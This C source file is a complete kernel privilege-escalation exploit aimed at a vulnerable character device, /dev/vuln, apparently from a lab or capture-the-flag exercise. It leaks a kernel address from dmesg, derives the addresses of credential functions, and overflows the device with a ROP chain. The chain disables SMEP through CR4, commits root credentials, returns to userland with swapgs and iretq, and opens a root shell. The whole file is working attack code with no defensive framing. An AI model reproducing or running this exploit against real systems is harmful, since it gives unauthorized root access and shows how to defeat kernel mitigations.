#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/mman.h>
#include <assert.h>

struct cred;
struct task_struct;
 
typedef struct cred *(*prepare_kernel_cred_t) (struct task_struct *daemon) __attribute__((regparm(3)));
typedef int (*commit_creds_t) (struct cred *new) __attribute__((regparm(3)));
 
prepare_kernel_cred_t   prepare_kernel_cred;
commit_creds_t    commit_creds;

unsigned long user_cs;
unsigned long user_ss;
unsigned long user_rflags;
unsigned long stack;

/*
  this function is needed to backup userland env
  these values are necessary just after the iretq calls
*/
static void save_state() {
  asm(
  "movq %%cs, %0\n"
  "movq %%ss, %1\n"
  "pushfq\n"
  "popq %2\n"
  : "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags) : : "memory"     );
}

/* function to get root id */
void getroot (void)
{
  commit_creds(prepare_kernel_cred(0));
}

/*
  this function check if we get root id and pop a shell if correct
  the memory addr of the function is placed in the ROP
*/
void shell(void) {
  printf("[+] getuid() ...");
  if(!getuid()) {
    printf(" [root]\n[+] Enjoy your shell...\n");
    system("/bin/sh");
  } else {
    printf("[+] not root\n[+] failed !!!\n");
  }
}

/*
  This function try to find the usefull addr needed for the expoit
*/
unsigned long findAddr() {
  char line[512];
  char string[] = "Freeing SMP alternatives memory: 24K";
  char found[17];
  unsigned long addr=0;

  FILE* file = fopen("/tmp/dmesg", "r");

  while (fgets(line, sizeof(line), file)) {
    if(strstr(line,string)) {
      strncpy(found,line+53,16);
      sscanf(found,"%p",(void **)&addr);
      break;
    }
  }
  fclose(file);

  if(addr==0) {
    printf("    dmesg error...\n");
    exit(1);
  }

  return addr;
}

int main(int argc, char *argv[])
{
  int fd;
  unsigned char payload[237] = {0};
  unsigned char *p           = payload;
  unsigned long memOffset;

/* execute dmesg and place result in a file */
  printf("[+] Excecute dmesg...\n");
  system("dmesg > /tmp/dmesg");

/* find: Freeing SMP alternatives memory    */
  printf("[+] Find usefull addr...\n");
  memOffset = findAddr();
  printf("    addr[0x%llx]\n", memOffset);

/* set value for commit_creds and prepare_kernel_cred */
  commit_creds        = (commit_creds_t)(memOffset - 0xe071b0);
  prepare_kernel_cred = (prepare_kernel_cred_t)(memOffset - 0xe06e40);

/* open fd on /dev/vuln 							*/
  printf("[+] Open vuln device...\n");
  if ((fd = open("/dev/vuln", O_RDWR)) < 0) {
    printf("    Can't open device file: /dev/vuln\n");
    exit(1);
  }

/* payload                          */
  printf("[+] Construct the payload...\n");
  save_state();
  /* offset before RIP                    */
  memcpy(p,"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",116);
  p+=116;
/* pop rdi ; ret                    */
  unsigned long poprdi = (unsigned long)prepare_kernel_cred+0x1135d;
  memcpy(p,&poprdi,8);
  printf("    pop RDI      at 0x%lx\n", poprdi);
  p+=8;
  memcpy(p,"\xf0\x06\x00\x00\x00\x00\x00\x00",8);   /* SMEP OFF */
  p+=8;
/* mov cr4, rdi ; pop rbp ; ret     */
  unsigned long movcr4 = (unsigned long)prepare_kernel_cred-0x86880;
  memcpy(p,&movcr4,8);
  printf("    mov CR4, RDI at 0x%lx\n", movcr4);
  p+=8;
  memcpy(p,"\x42\x42\x42\x42\x42\x42\x42\x42",8);   /* for rbp */
  p+=8;
/* getroot                        */
  unsigned long gr = (unsigned long)getroot;
  memcpy(p,&gr,8);
  p+=8;
/* swapgs; pop rbp; ret           */
  unsigned long swapgs = (unsigned long)prepare_kernel_cred-0x3dfbc;
  printf("    swapgs       at 0x%lx\n", swapgs);
  memcpy(p,&swapgs,8);
  p+=8;
  memcpy(p,"\x42\x42\x42\x42\x42\x42\x42\x42",8);   /* for rbp */
  p+=8;
/* iretq                          */
  unsigned long iretq = (unsigned long)prepare_kernel_cred-0x61066;
  printf("    iretq        at 0x%lx\n", iretq);
  memcpy(p,&iretq,8);
  p+=8;
/*
    the stack should look like this after an iretq call
      RIP
      CS
      EFLAGS
      RSP
      SS
*/
/* shell                          */
  unsigned long sh = (unsigned long)shell;
  memcpy(p,&sh,8);
  p+=8;
/* user_cs                        */
  memcpy(p,&user_cs,8);
  p+=8;
/* user_rflags                    */
  memcpy(p,&user_rflags,8);
  p+=8;
/* stack of userspace             */
  register unsigned long rsp asm("rsp");
  unsigned long sp = (unsigned long)rsp;
  memcpy(p,&sp,8);
  p+=8;
/* user_ss                        */
  memcpy(p,&user_ss,8);

/* trig the vuln                  */
  printf("[+] Trig the vulnerablity...\n");
  write(fd, payload, 221);

  return 0;
}
